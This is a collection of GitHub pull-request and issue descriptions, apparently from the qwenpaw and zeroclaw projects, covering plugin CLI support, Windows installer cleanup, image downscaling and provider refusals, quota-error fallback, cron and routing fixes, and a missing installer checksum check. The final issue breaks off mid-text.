prs.title: feat(plugins): support CLI commands and extension points
prs.body:
## Description

Adds plugin CLI commands to the existing Click command tree and connects them to the plugin registry, dependency checks, and resource lifecycle.

### 1) Key CLI features

- Register root commands, nested commands, or complete Click groups through `ctx.register_cli(CliSpec(...))`. Native commands retain priority.
- Installed, enabled plugins expose their commands. Disable/uninstall removes them. Core commands remain available without plugins.
- Plugin commands run without starting the App. Root help uses static declarations; selecting a command checks dependencies and loads its implementation.
- Invocation cleanup completes before resources and source leases are released, including after Ctrl-C. No dedicated session thread or process is added.
- Core `models`, `channels`, and `doctor` commands discover plugin contributions. Unavailable implementations retain their saved configuration without becoming executable.

### 2) Supporting plugin-core changes — review requested

The design separates application declarations, capability registration, driver execution, and resource ownership, following OS concepts.

#### 2.1 Shared registration, independent receiver execution

Previously, `entry.descriptor` and `entry.backend` were mutually exclusive. They can now coexist under one plugin instance and rollback ledger.

Simplified flow:

    App loading:
        register static channel metadata
        register lightweight public contributions

    Plugin CLI:
        load the public entry and selected command

    Enabled workspace receiver:
        start the existing channel worker

This lets a channel plugin also provide CLI or client Tools without requiring its receiver to run. Global plugin disablement still blocks execution. Public registration failure rolls back the combined registration; per-capability failure isolation is not implemented.

#### 2.2 Capability dependencies and invocation side effects

Package-wide dependencies remain supported. Named `optional_dependencies` and per-contribution `requires` distinguish lightweight operations from SDK-dependent operations:

    status.requires = []
    send.requires = ["transport"]

    install/update/repair:
        prepare packages referenced by declared capabilities

    selected command:
        check requires -> build implementation -> execute -> clean up

This prevents an unrelated SDK prerequisite from gating a lightweight command. Authors must keep the public entry lightweight and defer SDK imports themselves.

CLI execution also skips installation callbacks and backend provision commits. It reuses registration and runtime cleanup without rewriting existing Tool/Skill configuration.

#### 2.3 Update: reduce plugin CLI startup and cleanup overhead

Cleanup previously imported memory/model implementations just to inspect resource ownership. The existing memory registry now lives in a lightweight module, preserving public imports and the shared registry instance.

    Before: cleanup -> public memory API -> memory/model imports
    After:  cleanup -> lightweight ownership registry

Dependency observation now retains only file paths matching imported modules while still validating every RECORD row. Existing dependency checks, cache invalidation, and ownership protection remain in place.

For the same local Hello command, median peak RSS fell **214.77 → 193.69 MiB (-21.08 MiB)** and runtime fell **2.656 → 2.385 s (-10.2%)**.

The fixed plugin still uses **17.86 MiB / 0.591 s more** than the native reference. This includes shared-environment inspection and loader/SDK setup. Runtime environment inspection remains a current design tradeoff; reducing it further requires the environment-management work described below.

### 3) Reviewer decisions and TODOs

- [ ] Approve version choices: proposed SDK `1.1.0`, new API `since` values, and channel versioning/schema changes.
  - Channel descriptor schema v3 adds named `requires`; schema v2 remains supported.
  - Review compatibility and migration policy. The worker IPC protocol version is unchanged.
- [ ] Review test necessity and cost: 32 added runtime scenarios took approximately 70.4 seconds locally, primarily real installation and worker rollback.
- [ ] Complete installed-SDK author type validation and cross-platform CI.

Follow-up TODO comments cover installation/runtime lifecycle separation, Tool/Skill dependency declarations, live cross-plugin services, broader extension consumers, per-capability failure/reclamation scopes, and shared runtime/source ownership infrastructure.

Current boundaries: SDK modules may remain cached in the App process; synchronous checks cannot be forcibly interrupted; source locks provide cooperative replacement protection rather than sandboxing.

Additional TODO comments in `loader.py` and `python_backend.py` describe a future environment-management change:

    install dependency updates into a new directory
    new processes use the new packages
    running processes keep their existing packages
    delete the old directory after its last process exits

The package/file lookup could then be prepared during installation and reused at runtime. This belongs in a separate PR covering installation, process startup, recovery, and cleanup. It must define when an existing App restarts to activate new dependencies and preserve desktop/user-managed Python environments.

Until those guarantees exist, retain runtime observation of the mutable shared environment. Its cost depends on installed packages and loaded modules; the measured residual memory difference is not a fixed per-plugin charge.

The performance follow-up also adds two focused regression tests and adapts one existing memory test fixture. These should be included in the test-cost review.

## Type of Change

- [x] Bug fix
- [x] New feature
- [ ] Breaking change
- [x] Documentation
- [x] Refactoring

## Component(s) Affected

- [x] Core / Backend (app, agents, config, providers, utils, local_models)
- [ ] Console (frontend web UI)
- [x] Channels (DingTalk, Lark, QQ, Discord, iMessage, etc.)
- [ ] Skills
- [x] CLI
- [ ] Documentation (website)
- [x] Tests
- [ ] CI/CD
- [ ] Scripts / Deploy

prs.title: fix(desktop): clean bundled Windows runtimes during upgrades and uninstall
prs.body:
## Description

Windows upgrades can fail when an external process restarts `qwenpaw --version` after the installer stops processes, locking bundled Python extensions again. File-by-file replacement and manifest-based uninstall also leave obsolete or unknown runtime files behind.

Keep the CLI unavailable throughout replacement, including the "uninstall before installing" path. Installation and uninstallation reuse the same cleanup helper to remove exactly four bundled directories under `binaries`: `qwenpaw-backend`, `python-runtime`, `channel-runtime`, and `node-runtime`.

- Gate the old CLI and Native Messaging launcher during maintenance; publish the staged CLI only after all resources have been copied.
- Keep the installation marker outside the directories being removed and recognize interrupted installations even when their binaries are gone. Retain compatibility with the previous marker location.
- Validate installation ancestors and runtime trees before deletion, rejecting links and other reparse points. Cleanup failure stops installation before copying the payload, or uninstallation before deleting the desktop executable, uninstaller, shortcuts and registration.
- Guard the registered previous installation before invoking its uninstaller, preserving the selected destination when upgrading to another directory. Newly generated uninstallers perform full runtime cleanup; already installed older uninstallers retain their existing deletion behavior.
- Reuse failure handling for installation and uninstallation. Cancellation before destructive work restores the old entry; after cleanup begins, rerunning the installer repairs the installation. No runtime rollback is added, and failed writes cannot be skipped.

An independent test-only commit fixes the PR's five failing WeChat retry cases: upstream now requires `workspace_dir`, but this fixture still constructed `WeChatPlatform` with an empty config. It now uses the existing `tmp_path`; no WeChat production behavior changes.

**Related Issue:** No linked issue; reproduced on Windows during a desktop upgrade.

**Security Considerations:** Cleanup is restricted to the four bundled runtime directories. User history, configuration, plugin dependencies and unrelated installation directories remain outside this cleanup. Files manually added inside the four bundled directories are removed.

## Type of Change

- [x] Bug fix
- [ ] New feature
- [ ] Breaking change
- [ ] Documentation
- [ ] Refactoring

- Targeted Windows installer tests: **25 passed, 18 skipped** using `pytest tests/unit/tauri/test_desktop_workflows.py --confcutdir=tests/unit/tauri -q -o addopts=''` with an isolated temporary directory.
- Coverage includes installation and uninstallation cleanup/retry, obsolete-file removal, locked-file failure, preservation of user data and unrelated directories, nested/dangling junction rejection, interrupted-install recognition, legacy marker recovery, repeated CLI relaunches, and cancellation/legacy-uninstall handling.
- The five WeChat cases that failed on both Python 3.11 and 3.13 in CI pass locally: `pytest tests/unit/channels/test_wechat.py -k test_send_retries_only_unsent_connection_attempts -q -o addopts=''` (**5 passed, 15 deselected**).

prs.title: fix(media): enforce the inline budget, rescale after a refusal, and report omissions
prs.body:
## What Problem This Solves

The downscale pass added in #8632 judged an image by its longest side alone. Three gaps followed from that, and they are fixed together because they meet on the same path.

**1. The byte budget and the side limit are two independent limits.**
A 2000x2000 PNG is well inside the 8192 px side limit and can still weigh 11.46 MiB, so the pass returned it untouched and the formatter rejected the request on bytes right afterwards. Both limits are now checked, and a formatter that provisions its own limits passes them down, so this pass and the cap cannot disagree about what fits.

**2. PNG has no quality knob.**
Every quality step emitted the same bytes and paid for another full deflate. The quality loop is skipped for PNG; only reducing the side makes it smaller.

**3. A rejection could not name the image it rejected.**
The retry log said "some media" while every image in the request was dropped, which left no way to tell which one the provider objected to. Each wire media block now gets a label (position, media type, decoded size) across the Anthropic `source`, OpenAI `image_url` and Gemini `inline_data`/`file_data` spellings, and the log names them.

**4. A rejection that named the media was replayed forever.**
Non-streaming recovery recognised only `413` / body-size wording. A `400 image dimensions exceed the maximum allowed size` fell through to `raise`, and because the offending block stayed in `state.context`, every later turn sent it again and collected the same rejection. The streaming path did strip media, but only for that one request — the identical loop, one turn later.

Both paths now classify a payload refusal, mark the historical copies as omitted once (`mark_media_omitted_after_overflow`) and retry. The stored message keeps its bytes, so the full-resolution file stays retrievable; only request copies are stripped.

**5. When the refusal is about the active turn, shrinking beats deleting.**
If nothing historical can be omitted, the refusal is about the image the user is asking about. Deleting it would be wrong. The request-scoped limits (`max_image_side`, `max_bytes`) are halved once for a single retry and restored afterwards, so the retry sends a smaller rendition while the stored message is untouched.

**6. Dropped media was invisible to the user.**
When media is replaced by a text placeholder the model answers as if the file had never been attached — indistinguishable from "the model ignored my image". The reply now carries `qwenpaw_media_omitted` (`{count, reason}`), which the Console renders as one system line and non-Console channels send as one extra text line.

## Scope

Type: B (state machine / retry), with a D-shaped surface because the notice crosses agents → channels → console.

- `src/qwenpaw/providers/capping_formatter.py` — `MAX_IMAGE_SIDE` moves here, beside the byte cap, so both media limits have one home; new `max_image_side` field (`ge=0`, default 8192).
- `src/qwenpaw/agents/utils/image_resize.py` — two limits decided independently, `max_side` threaded through, quality loop skipped for PNG.
- `src/qwenpaw/agents/model_factory.py` — reads the formatter's limits and passes them down; new `_describe_wire_media_blocks` / `_wire_media_label`.
- `src/qwenpaw/agents/utils/message_request_normalizer.py` — threads `max_bytes` / `max_side` to the resize pass.
- `src/qwenpaw/agents/react_agent.py` — payload-refusal classification on the non-streaming path, one-shot limit tightening with restore, per-response omission notice.
- `src/qwenpaw/app/channels/base.py` — `_media_omitted_notice`, sent with the existing fallback notice so channels without Console rendering see it too.
- `console/src/pages/Chat/fallbackNotice.ts`, `console/src/pages/Chat/index.tsx`, `console/src/locales/{en,zh}.json` — parse and render the notice.

## Self-review

1. **Callers of `downscale_image_bytes`** — `_rescale_source` is the only intermediate, `normalize_messages_for_model_request_async` the only entry point; both are updated, and both keep the old behaviour when the new keyword arguments are omitted (`max_side=MAX_IMAGE_SIDE`, `max_bytes=MAX_INLINE_MEDIA_BYTES`).
2. **`MAX_IMAGE_SIDE` relocation** — `grep -rn MAX_IMAGE_SIDE src/` returns only `capping_formatter.py` (definition) and the modules that import it; no stale constant remains in `image_resize`.
3. **`max_image_side` as a new field** — declared with `ge=0` and the same default as before (8192), so every existing formatter subclass inherits it; `_normalize_messages_for_formatter` reads it with `getattr(..., MAX_IMAGE_SIDE)` so a custom formatter without the field still works.
4. **`_describe_wire_media_blocks`** — used only by `QwenPawAgent._last_wire_media_summary`, which returns `[]` when no formatter is active.
5. **Reversal** — `max_bytes <= 0` keeps its old meaning of "no byte limit" rather than shrinking forever.
6. **Both limits agree** — the resize pass receives `formatter.max_bytes` / `formatter.max_image_side` instead of the module constants, so a provider override cannot make the pass shrink to a different budget than the one enforced a moment later.
7. **Bounded retries** — the shared recovery budget (`remaining = 2`) is unchanged. Limit tightening is one-shot per request: `_qwenpaw_media_limits_tightened` blocks a second shrink, and both `finally` blocks restore the original pair, so an unrelated later request is not silently served smaller images.
8. **Stored history is not rewritten** — the omission pass only writes `qwenpaw_omitted_media_ids` metadata. `test_omissions_survive_resume_and_allow_new_images` verifies the state round-trips and a newly attached image is still sent.
9. **The notice is additive** — with no omission the channel output is byte-identical to the previous string (a single fallback line). An unparsable notice renders nothing rather than an empty system message.
10. **Non-streaming classifier stays narrow** — `is_request_body_too_large` is untouched (still `413` / body-size only); the media branch is a separate condition that additionally requires media on the wire and the existing payload-rejection classifier.

## Test scope

- Targeted: `test_context_overflow_recovery.py` + `test_react_agent_media_strip.py` + `test_media_omitted_notice.py` + `test_message_request_normalizer.py` + `test_image_resize.py` + `tests/unit/app/channels` — **365 passed**
- Adjacent: `tests/unit/agents -k 'media or overflow or omitt'` — **460 passed, 3 skipped**
- Console: `fallbackNotice.test.ts` — **6 passed**; `sdkHostIntegration.test.tsx` + `ChatPage.coverage.test.tsx` — **196 passed**; `tsc -b --noEmit` clean; `prettier --check` clean
- `pre-commit run --files <changed files>` — all hooks passed (black reformatted two test files on the first pass, clean on the re-run)

## Evidence

A 2000x2000 high-entropy PNG, well inside the side limit and far over the byte cap:

```
INPUT   side=2000x2000  bytes=12,015,257  (11.46 MiB)
        longest side 2000 <= 8192 -> the old side-only check returned this unchanged
OUTPUT  bytes=596,065  (0.57 MiB)  media_type=image/png  changed=True
        under 2 MiB cap: True

max_bytes=0 -> unchanged=True  (11.46 MiB)
```

The media labels, one per wire spelling:

```
#1 image/png 1.0 MiB      (Anthropic source)
#1 image/jpeg 1.0 MiB     (OpenAI image_url data URL)
#1 image/webp 1.0 MiB     (Gemini inline_data)
```

The refusal path, measured before and after the change:

```
before  marked=0  max_image_side=8192  qwenpaw_media_omitted=ABSENT
after   marked=8  max_image_side=8192 (history had blocks to omit)

active-turn only:
before  marked=0  side=8192 bytes=2097152
retry   side=4096 bytes=1048576
after   side=8192 bytes=2097152 (restored)
```

Removing the new classifier turns two tests red; removing the streaming omission call turns one red — both restored afterwards.

Refs #8632, #8629

prs.body:
### Summary

Adds a `save_draft` MCP tool to qwenpawmail-mcp that writes a message into the mailbox **Drafts** folder via IMAP APPEND with the `\Draft` flag — **without sending over SMTP**.

Closes #8780.

### Changes

- `packages/qwenpawmail-mcp/src/qwenpawmail_mcp/mail_client.py`
  - `MailClient.save_draft(to, subject, body, cc, folder)` — builds the message with the existing `_build_message` helper, appends it to the Drafts folder, and returns the parsed `APPENDUID`.
  - `MailClient._drafts_folder()` — auto-detects the folder flagged `\Drafts`, falls back to `Drafts` / `草稿箱`.
  - `_extract_appenduid()` helper to parse the APPEND response.
- `packages/qwenpawmail-mcp/src/qwenpawmail_mcp/server.py`
  - New `save_draft` MCP tool (thin async wrapper, consistent with existing tools).
- `packages/qwenpawmail-mcp/tests/test_save_draft.py`
  - Unit tests: tool registration + argument coercion, cc/explicit folder handling, drafts-folder auto-detection and fallback.

### Why

For agent workflows where the user wants the agent to *draft* an email for later human review, there was no way to write into the mailbox Drafts folder without immediately sending. `send_message` / `reply_message` / `forward_message` all transmit via SMTP as soon as they are called.

### Verification

- End-to-end verified against a NetEase enterprise mailbox (`imap.qiye.163.com`): APPEND → Drafts folder, fetch-by-UID round-trip, and cleanup all work.
- `pytest tests/` → 7 passed (4 existing + 3 new).
- black / flake8 / pylint / mypy clean for the touched files.

### Notes

- On some providers, IMAP SEARCH does not index freshly APPENDed messages, so the tool returns the `APPENDUID`; callers fetch the draft by UID via the existing `get_message(folder, uid)`.

prs.title: fix(providers): allow fallback for 4xx quota errors
prs.body:
## Summary

Some providers return HTTP 400 with a quota or rate-limit message instead of
HTTP 429 when the primary model's quota is exhausted. The shared error policy
classified these responses as `bad_request`, which made them ineligible for
cross-model fallback.

This change recognizes structured provider error codes and narrowly scoped
quota and rate-limit messages on 4xx responses before the generic
`bad_request` fallback, allowing `FallbackChatModel` to try the next
configured model without retrying an exhausted quota.

## Changes

- Read normalized provider `code` and `type` values from structured error
  payloads, with complete semantic phrases as the message fallback.
- Classify non-429 quota exhaustion as `quota_exceeded`, allowing fallback
  without retrying the same model.
- Preserve retry behavior for standard HTTP 429 and explicit rate-limit
  errors, along with the existing priority of authentication,
  model-not-found, request-size, context-overflow, and content-safety
  classification.
- Add negative tests proving that unrelated quota and rate-limit parameter
  errors remain `bad_request`.
- Add a production-style `FallbackChatModel` to `RetryChatModel` regression
  test proving that the primary and fallback models are each called once.

## Validation

- `python -m pytest tests/unit/providers/test_model_error_policy.py tests/unit/providers/test_fallback_chat_model.py -q`
  - 73 passed.
- `python -m pytest tests/unit/providers -q`
  - 1170 passed, 1 skipped, 2 failed.
  - Both failures are unrelated to this change and occur while importing the
    unavailable `reme.components.as_decision_model` module.
- All pre-commit hooks applicable to the changed Python files passed.

Fixes #8776

issues.body:
### Task

Make `Agent::turn` and `Agent::turn_streamed` ask a capability-built agent's provider source for a selected route's provider and model, instead of sending the source's default provider a `hint:<name>` selector.

### Context

`Agent::from_config_with_capabilities` (#11174) asks the source for the default model's provider and builds the route table from `config.model_routes`. When effort routing, query classification or auto-classify selects a route, `classify_model` returns `hint:<name>`, and both turn paths dispatch it to that default provider. The config-backed source's provider decodes `hint:`, so configured agents are unaffected. A supplied provider receives `hint:<name>` as a model name. It either errors, or serves its default model while the turn records the route's model.

The CLI loop and `process_message` already ask the source again with the route's provider, model and route-scoped config (`effort_turn_route` in `loop_.rs`). RPC sessions run on `Agent`, so they share the gap. There is no in-tree supplied caller of `Agent` until #11187. `runtime-composition.md` documents the current behavior.

Related #11174, #10993, #11516, #11187.

### Acceptance criteria

- On a capability-built `Agent`, a turn that selects a route asks the supplied source with the route's provider reference and model, and with the route-scoped config for an effort route. The provider it returns is sent the route's model, never `hint:<name>`. This holds for both `turn` and `turn_streamed`.
- An adapter-built agent keeps today's behavior: its routed provider decodes `hint:`. A mid-turn `model_switch` still replaces the provider for later rounds.
- A recording-source test covers both turn paths, and fails when the source request is removed.
- `runtime-composition.md` drops the `hint:` caveat.

### Likely files or areas

`crates/zeroclaw-runtime/src/agent/agent.rs` (`classify_model`, `turn`, `turn_streamed_with_steering_body`), `crates/zeroclaw-runtime/src/agent/loop_.rs` (`effort_scoped_provider_config`), `docs/book/src/architecture/runtime-composition.md`

### Contributor fit

maintainer-scoped task, not yet ready for pickup labels

### Mentor, reviewer, or contact

@JordanTheJet (author of #11174)

### Risk notes

Turn dispatch on capability-built agents only. A mistake could send a routed turn to the wrong provider or refuse it. Adapter-built agents must not change.

issues.body:
## Task

Stop `cron update` from silently discarding changes to a declarative (`source = "declarative"`) job. Six columns are affected today: `command`, `name`, `expression`/`schedule`, `session_target`, `allowed_tools` and `uses_memory`.

Either reject them at `update_job` with a message naming the owning config key, matching the `delivery` and `shell_output_format` guards already there, or update the canonical config instead. A regression should cover the startup-sync boundary.

## Context

Surfaced during review of #9350. That PR added `delivery` to the same trap and guarded it; this issue covers the rest, which predate it.

A `[cron.<id>]` job is owned by `config.toml` and materialized with `source = "declarative"`. `update_job` persists a patch for such a row and reports success:

```rust
// crates/zeroclaw-runtime/src/cron/store.rs, update_job
if job.source == "declarative" {
    conn.execute(
        "UPDATE cron_jobs
         SET expression = ?1, command = ?2, schedule = ?3, job_type = ?4, prompt = ?5, name = ?6,
             session_target = ?7, model = ?8, enabled = ?9, delivery = ?10, delete_after_run = ?11,
             allowed_tools = ?12, next_run = ?13, uses_memory = ?14
         WHERE id = ?15",
```

`sync_declarative_jobs` then rewrites every one of those columns from the canonical `CronJobDecl` on the next daemon start, in both the schedule-changed and unchanged branches:

```sql
UPDATE cron_jobs
   SET expression = ?1, command = ?2, schedule = ?3, job_type = ?4,
       prompt = ?5, name = ?6, session_target = ?7, model = ?8,
       enabled = ?9, delivery = ?10, delete_after_run = ?11,
       allowed_tools = ?12, source = 'declarative', uses_memory = ?13
 WHERE id = ?14
```

So the CLI reports success, the row changes, and the change disappears at the next restart, reverting to the config value. The user gets no signal at any point.

The only production caller of `sync_declarative_jobs` is the scheduler's daemon-startup path, which is why this is invisible in a single session and only shows up after a restart.

**Two columns are already guarded**, and they establish the pattern this issue asks to extend:

- `shell_output_format` bails with "owned by config.toml for a declarative job, not the database".
- `delivery` bails with the owning key, added in #9350.

The comment on the first states the intent directly: `update_job` is "the core boundary every caller of `update_job` goes through, so it must reject them too rather than silently ignoring or persisting a value execution never consumes."

## Affected flags

Reachable today via `zeroclaw cron update <declarative-id>`:

| Flag | Column |
|---|---|
| `--command` | `command` |
| `--name` | `name` |
| `--expression`, `--tz` | `expression`, `schedule` |
| `--allowed-tool` | `allowed_tools` |
| `--uses-memory` | `uses_memory` |

`model`, `session_target`, `prompt`, `enabled` and `delete_after_run` are in the same UPDATE and would be reverted identically if a caller patched them, though the CLI does not currently expose all of them.

## Acceptance criteria

- A `cron update` that would change a config-owned column on a declarative job fails with a non-zero exit and an error naming the specific `[cron.<id>]` key, rather than persisting a value the next sync discards.
- Imperative jobs are unaffected; an update that sets none of the affected fields still succeeds on a declarative job.
- Store-level regressions per field, following `update_job_rejects_delivery_for_declarative_job`, which asserts the rejection and then runs `sync_declarative_jobs` to demonstrate the revert being prevented.
- At least one binary-boundary regression. Note that no CLI command runs `sync_declarative_jobs` — the only production caller is the scheduler's daemon start — so a component test has to seed the declarative row through the library, as `tests/component/cron_delivery_cli.rs` and `zeroclaw-gateway`'s own declarative test both do.

## Likely files or areas

- `crates/zeroclaw-runtime/src/cron/store.rs` — `update_job` (existing guards are the model), and `sync_declarative_jobs` for the revert behaviour.
- `src/cron/mod.rs` — the `Update` command arm, if the maintainers prefer an earlier, friendlier failure.
- `tests/component/cron_delivery_cli.rs` — existing harness with a declarative seed helper.

## Mentor, reviewer, or contact

@Audacity88 and @IftekharUddin, both of whom reviewed #9350 where this surfaced. @IftekharUddin asked for the deferral to be tracked here rather than left as an offer in that thread (FND-005 §5).

## Risk notes

Behaviour change: commands that currently appear to succeed would start failing. That is the point — they were never actually taking effect — but it is user-visible and belongs in the compatibility section of whatever PR implements it. Confined to the cron store boundary; no schema change, no migration.

Deciding between "reject" and "write through to config.toml" is worth settling before implementation. Rejecting is consistent with the two existing guards and much smaller; writing through would make the CLI a config editor, which is a larger design question.

labels.name: enhancement
labels.description: New feature or request

labels.name: status:in-progress

issues.body:
Follow-up split from #10779. The quota-exhausted classifier slice is in #11767; this tracks the remaining Retry-After part.

### Current behavior

For a retryable 429, `ReliableModelProvider::compute_backoff` and the rate-limit cooldown use `parse_retry_after_ms` (`crates/zeroclaw-providers/src/reliable.rs`). That function only scans the **error message text** for `Retry-After:` / `retry_after:`. Provider errors reach the Reliable layer as plain text: `api_error` / `api_error_from_parts` in `crates/zeroclaw-providers/src/lib.rs` format `"{provider} API error ({status}): {body}"` and drop the response headers. So a standard HTTP `Retry-After` response header is never seen. The provider then falls back to its fixed backoff (500 ms, 1 s, …) even when the upstream said exactly how long to wait.

### Expected behavior

For transient 429s (and 503s where providers send it), honor the HTTP `Retry-After` header in both forms: delta-seconds and HTTP-date. Keep the existing 30 s cap and the existing text fallback.

### Notes on scope

- `api_error(model_provider, response)` still has the `reqwest::Response`, so it is the natural shared point to capture the header. One option is a typed error source carrying the parsed delay, which `parse_retry_after_ms` checks before the text scan, rather than appending more text.
- Several providers build their own error strings and would bypass that helper. Examples: `gemini.rs`, `ollama.rs`, `hailo_ollama.rs`, `telnyx.rs`, and the OpenAI Responses streaming path in `openai.rs`. Each needs either to route through the helper or to carry the header the same way.
- Channel-side precedent for honoring `Retry-After` headers: #7027.

### Acceptance

- A 429 response whose `Retry-After` header says N seconds produces a backoff of N s (capped), proven with a mock HTTP response rather than an error string.
- HTTP-date form parsed; a malformed header falls back to existing behavior.
- Non-retryable business 429s still fail fast (no wait).

issues.body:
### Affected component

runtime/daemon

### Severity

S2 - degraded behavior

### Current behavior

On current `master` (`c014b84d0aef85fb77c18cdcc1b207228adfcd89`), an explicit cached-input rate of `0.0` suppresses missing-pricing provenance even when the standard input rate it falls back to is absent.

`normalized_rates` preserves `cached_input_per_mtok = Some(0.0)` as configured. `unpriced_usage` marks cached tokens unpriced only when both the cached-input rate and standard input rate are `None`, so `cached = Some(0.0)` plus `input = None` reports zero unpriced cached tokens. `TokenUsage::new_with_cache` then interprets the zero cached rate as “use the standard input rate,” receives `0.0` for the absent standard input rate, and records the cached tokens at zero cost.

The resulting ledger row has `unpriced_tokens = 0` and `pricing_available = true`. The runtime warning does not fire, `zeroclaw status` does not show the pricing-unavailable warning for those tokens, and budget headroom can be overstated.

The current unit test in `crates/zeroclaw-runtime/src/agent/cost.rs` pins the incorrect result: a cached-only rate set to `Some(0.0)` with no input rate expects 100 fully cached input tokens to produce zero unpriced tokens.

This is a focused residual defect from #9939. It is related to #9816 but does not duplicate its remaining default-Anthropic-pricing scope. It is also distinct from #10699, which tracks cache-write token accounting and the write-rate premium. No fixing PR was found in the open or closed search.

### Expected behavior

A zero cached-input rate should count cached tokens as priced only when the standard input rate needed by that fallback is present. If both the effective cached rate and its standard-input fallback are unavailable, the cached tokens should be recorded in `unpriced_tokens`, `pricing_available` should be `false`, and the existing runtime and `zeroclaw status` warnings should remain visible.

The fix should preserve the established meanings of configured zero rates: input and output `0.0` remain explicitly free, while cached-input `0.0` remains “no cache discount” and uses the standard input rate.

A ledger-boundary regression should cover `cached_input_per_mtok = Some(0.0)`, `input_per_mtok = None`, and token usage containing cached input. It should prove that the persisted row carries the cached-token count as unpriced and that the warning path sees it. Existing cases where a standard input rate is present should remain priced.

### Steps to reproduce

```bash
git clone https://github.com/zeroclaw-labs/zeroclaw.git zeroclaw-zero-cache-warning-repro
cd zeroclaw-zero-cache-warning-repro
git checkout c014b84d0aef85fb77c18cdcc1b207228adfcd89

# This current-master test passes while asserting the incorrect result:
# cached_input_per_mtok = Some(0.0), input_per_mtok = None, and 100 cached
# input tokens produce zero unpriced tokens.
cargo test --locked -p zeroclaw-runtime unpriced_count_tracks_each_token_bearing_dimension

# Inspect the exact assertion and the production availability predicate.
sed -n '912,938p' crates/zeroclaw-runtime/src/agent/cost.rs
sed -n '241,268p' crates/zeroclaw-runtime/src/agent/cost.rs
sed -n '96,108p' crates/zeroclaw-config/src/cost/types.rs
```

### Impact

Affected users: operators whose configured or discovered pricing contains the zero cached-input sentinel without a standard input rate.

Frequency: every token-bearing cached-input record in that pricing state.

Consequence: cached usage is silently recorded at zero cost and marked fully priced, so the pricing-unavailable warning disappears and spend-cap headroom appears safer than the ledger can support.

### Logs / stack traces

_No response_

### ZeroClaw version

`master` at `c014b84d0aef85fb77c18cdcc1b207228adfcd89`

### Rust version

Not applicable; source-level reproduction did not require a build.

Platform-independent source defect; verified from macOS 26.6.2 arm64.

Unknown

issues.body:
### Task

Add a routing regression test for a `switch` on `$.decisions` when an SOP's decision answers are ignored, and make the fallback's log notes and docs precise about what routing does in that case.

### Context

When a decision model's answers are ignored (the model is unavailable, the gate answer is unusable, or the mode answer is unusable with `modes` set), there are no step answers. `decide` and `unless_decided` then run every step. Routing behaves differently: a guard that reads a missing `$.decisions.N` is false (`sop/condition.rs`), and a `switch` with no matching port completes the run (`sop/route/mod.rs`). So a `switch` whose ports all read `$.decisions` ends the run without its remaining steps. `docs/book/src/sop/decision-models.md` describes this since #12237, but nothing tests it.

Two log notes are also less precise than they could be:

- `step answers ignored; every step runs` is true for `decide` and `unless_decided` skips but not for a `switch` like the one above.
- The gate note says `using strictest` even when the fallback keeps the authored mode (`deterministic`, or `priority_based` without `step_by_step` listed).

Both came up in the #12237 reviews.

### Acceptance criteria

- A test drives a `switch` whose ports all read `$.decisions` with the answers ignored, and asserts what the run does.
- The `every step runs` note and the matching sentence in `decision-models.md` say what happens to such a `switch`.
- The gate note names the mode actually used when the fallback keeps the authored mode.

- crates/zeroclaw-runtime/src/sop/condition.rs
- crates/zeroclaw-runtime/src/sop/route/mod.rs
- crates/zeroclaw-runtime/src/sop/decision.rs

issues.body:
### Affected component tooling/ci ### Severity S2 - degraded behavior ### Current behavior `setup.bat:171-197` resolves the asset URL (via `gh release view ... --jq`, or the `releases/latest/download/zeroclaw-x86_64-pc-windows-msvc.zip` fallback), downloads it with `curl -sSfL`, and immediately extracts it with `tar -xf` (fallback `Expand-Archive`) into `%USERPROFILE%\.zeroclaw\bin`. The generated PowerShell block in `docs/book/src/setup/windows.md:18-47` (source: `xtask/src/generate/docs.rs`) does the same with `Invoke-WebRequest` and `Expand-Archive`. Neither fetches or checks `SHA256SUMS`. Every release publishes `SHA256SUMS` next to the archives (v0.8.7 assets). `install.sh:312-370` downloads it, verifies the tarball, and falls back to a source build when it cannot verify; `zeroclaw update` refuses an asset whose digest does not match (`src/commands/update.rs:451-452`, `500-580`). The Windows prebuilt routes are the only installers that trust the bytes as downloaded. ### Expected behavior Both Windows routes download `SHA256SUMS` from the same release tag as the archive (resolve the tag first; the `latest/download` fallback and a separately fetched manifest can disagree while a release is being published), compute the digest (`certutil -hashfile SHA256` in cmd, `Get-FileHash` in PowerShell), compare it with the entry for `zeroclaw-x86_64-pc-windows-msvc.zip`, and stop before extraction on a mismatch or a missing manifest, matching install.sh. The generator template changes with the doc block. ### Steps to reproduce ```bash grep -n "SHA256\|certutil\|Get-FileHash" setup.bat docs/book/src/setup/windows.md # no matches sed -n '185,197p' setup.bat # curl -> tar -xf, no digest step sed -n '336,370p' install.sh # the Unix route fetches SHA256SUMS and verifies ``` ### Impact **Attack vector.** An attacker who can change bytes between GitHub and the user: a TLS-intercepting proxy whose root certificate the machine trusts (common on corporate networks), hostile Wi-Fi with a planted root, a cache or mirror serving a different asset, or a substituted release asset. The script extracts and runs the result immediately as the user. **Likelihood.** Low. GitHub over TLS is a strong baseline. A checksum defends against corruption and single-asset substitution when the manifest arrives through a path the attacker does not control; it does not defend against a full release compromise where `SHA256SUMS` is replaced as well. The value is parity with `install.sh` and `zeroclaw update`, which already pay this cost. **Data exposed.** Full account compromise at install time (an arbitrary binary runs as the user), then every provider key, token and conversation the user later entrusts to that binary. **Attack path** ```mermaid sequenceDiagram autonumber participant U as setup.bat / PowerShell block participant N as Network path
(proxy with trusted root, hostile Wi-Fi, cache) participant G as GitHub releases U->>N: GET zeroclaw-x86_64-pc-windows-msvc.zip N->>G: fetch G-->>N: zip (SHA256SUMS is published but never requested) N-->>U: zip, possibly altered U->>U: tar -xf into %USERPROFILE%\.zeroclaw\bin U->>U: run zeroclaw.exe as the user Note over U: no digest comparison here. install.sh and zeroclaw update verify SHA256SUMS at this step ``` **Data flow** ```mermaid flowchart LR subgraph unix ["install.sh and zeroclaw update"] A1["download archive"] --> A2["download SHA256SUMS"] A2 --> A3{"digest matches?"} A3 -->|"yes"| A4["install"] A3 -->|"no"| A5["refuse / source build"] end subgraph win ["setup.bat --prebuilt and the docs PowerShell block"] B1["download zip"] --> B2["extract"] --> B3["run"] end classDef bad fill:#fde2e2,stroke:#b00000,color:#000 class B1,B2,B3 bad ``` **Evidence:** static review of master `1c1cd118ac` and the v0.8.7 release assets. ### Logs / stack traces _No response_ ### ZeroClaw version master `1c1cd118ac` (v0.8.7) ### Rust version not applicable ### Operating system Windows 10 / 11 ### Regression? labels.name: topic:sop

issues.body:
### Task

Make `authorize_sop_cancel` decide "local" with the same rule the rate-limit key uses: a request is local only when its peer is loopback and no forwarded header says otherwise. A forwarded loopback address must never count as local.

### Context

